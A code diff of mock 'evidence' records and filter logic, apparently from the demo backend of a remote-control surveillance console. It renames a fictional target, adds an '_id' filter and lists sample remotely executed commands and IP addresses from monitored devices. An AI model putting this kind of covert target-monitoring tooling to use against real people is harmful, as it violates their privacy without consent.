@@ -179,13 +179,15 @@ package it.ht.rcs.console.evidence.rest
       
     public static var command:ArrayCollection=new ArrayCollection([
       
-      // John Doe (SwordFish) a1 desktop, a2 mobile
+      // Jimmy Page (SwordFish) a1 desktop, a2 mobile
       new Evidence({_id: 'c01', aid: 'a1', blo: false, da: 1336135607, dr: 1336135607, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
       new Evidence({_id: 'c02', aid: 'a2', blo: true, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '',  data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
       new Evidence({_id: 'c03', aid: 'a2', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
+      
       // Alejandro Reade (Swordfish), a3 desktop
       new Evidence({_id: 'c04', aid: 'a3', blo: false, da: 1336135607, dr: 1336135607, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
       new Evidence({_id: 'c05', aid: 'a3', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
+      
       // Joey Fargo (SwordFish), a4 desktop,a5 desktop, a6 mobile
       new Evidence({_id: 'c06', aid: 'a4', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
       new Evidence({_id: 'c07', aid: 'a5', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({command: 'cmd.exe /c dir c:\\', content: 'Il volume nell\'unita C non ha etichetta. \nNumero di serie del volume: 207B-b349\nDirectory di c:\\ \n17/06/2008 12.25 0 AUTOEXEC.BAT\n17/06/2008/ 12.25 0 CONFIG.SYS\n26/11/2010 16.56 Documents and Settings'})}),
@@ -204,13 +206,15 @@ package it.ht.rcs.console.evidence.rest
       
     public static var ip:ArrayCollection=new ArrayCollection([
       
-      // John Doe (SwordFish) a1 desktop, a2 mobile
+      // Jimmy Page (SwordFish) a1 desktop, a2 mobile
       new Evidence({_id: 'c01', aid: 'a1', blo: false, da: 1336135607, dr: 1336135607, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({content: '172.16.42.2'})}),
       new Evidence({_id: 'c02', aid: 'a2', blo: true, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '',  data: new EvidenceData({content: '172.16.42.2'})}),
       new Evidence({_id: 'c03', aid: 'a2', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({content: '172.16.42.2'})}),
+      
       // Alejandro Reade (Swordfish), a3 desktop
       new Evidence({_id: 'c04', aid: 'a3', blo: false, da: 1336135607, dr: 1336135607, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({content: '172.20.20.170'})}),
       new Evidence({_id: 'c05', aid: 'a3', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({content: '172.20.20.170'})}),
+      
       // Joey Fargo (SwordFish), a4 desktop,a5 desktop, a6 mobile
       new Evidence({_id: 'c06', aid: 'a4', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({content: '172.20.20.193'})}),
       new Evidence({_id: 'c07', aid: 'a5', blo: false, da: 1309354166, dr: 1309354166, _mid: 0, note: '', rel: 0, type: '', data: new EvidenceData({content: '172.20.20.193'})}),
@@ -244,6 +248,7 @@ package it.ht.rcs.console.evidence.rest
       
       for(var criteria:* in filter)
       {
+        if(criteria=="_id" && !(item._id == filter._id)) {result=false; break;}
         if(criteria=="target" && !(DBAgentDemo.getTarget(item.aid)==filter.target)) {result=false; break;}
         if(criteria=="agent" && !(item.aid == filter.agent)) {result=false; break;}
         if(criteria=="type" && !isInArray(item.type, filter.type)) {result=false; break;}
@@ -262,6 +267,7 @@ package it.ht.rcs.console.evidence.rest
       
       for(var criteria:* in filter)
       {
+        if(criteria=="_id" && !(item._id == filter._id)) {result=false; break;}
         if(criteria=="target" && !(DBAgentDemo.getTarget(item.aid)==filter.target)) {result=false; break;}
         if(criteria=="agent" && !(item.aid == filter.agent)) {result=false; break;}
         if(criteria=="type" && !isInArray(item.type, filter.type)) {result=false; break;}
@@ -280,6 +286,7 @@ package it.ht.rcs.console.evidence.rest
       
       for(var criteria:* in filter)
       {
+        if(criteria=="_id" && !(item._id == filter._id)) {result=false; break;}
         if(criteria=="target" && !(DBAgentDemo.getTarget(item.aid)==filter.target)) {result=false; break;}
         if(criteria=="agent" && !(item.aid == filter.agent)) {result=false; break;}
         if(criteria=="type" && !isInArray(item.type, filter.type)) {result=false; break;}
